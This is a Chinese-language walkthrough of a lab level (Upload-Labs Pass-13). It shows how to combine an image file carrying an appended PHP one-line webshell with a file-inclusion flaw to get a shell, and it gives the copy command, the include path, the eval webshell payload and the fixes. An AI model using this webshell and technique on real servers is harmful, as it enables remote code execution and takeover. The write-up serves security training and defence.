# Upload-Labs | Pass-13 图片马绕过 文件包含配合
## 一、漏洞简介
服务端检查文件内容，用getimagesize()判断是不是真实图片。可以制作图片马，把一句话木马藏在图片里，再配合文件包含漏洞解析执行。
## 二、环境信息
靶场地址：http://127.0.0.1/upload-labs/
关卡路径：/Pass-13/
漏洞类型：图片马、文件包含配合
## 三、复现步骤
1. 准备一张正常图片test.jpg和一句话木马shell.php。
2. 命令行合成图片马：copy test.jpg/b + shell.php/a shell.jpg
   意思是把php代码追加到图片末尾。
3. 上传shell.jpg，服务端getimagesize()检测是合法图片，放行。
4. 利用文件包含漏洞，访问：include.php?file=upload/shell.jpg
5. 图片里的PHP代码被包含执行，蚁剑连接getshell。
## 四、Payload
图片马制作：copy 正常图.jpg/b + 木马.php/a 马.jpg
包含路径：?file=upload/shell.jpg
一句话：<?php @eval($_POST['cmd']);?>
## 五、漏洞原理
服务端只检查文件头是不是图片格式，但是图片文件后面追加PHP代码，getimagesize()依然能识别出图片尺寸。配合文件包含漏洞，图片文件被当作PHP脚本包含执行，木马生效。
## 六、修复方案
1. 上传目录禁止PHP解析。
2. 文件包含时做白名单限制，不允许用户可控包含路径。
3. 对上传图片做重新渲染处理。
## 七、总结
单独上传图片马无法直接getshell，必须配合文件包含漏洞。这是文件上传+文件包含的组合拳考点。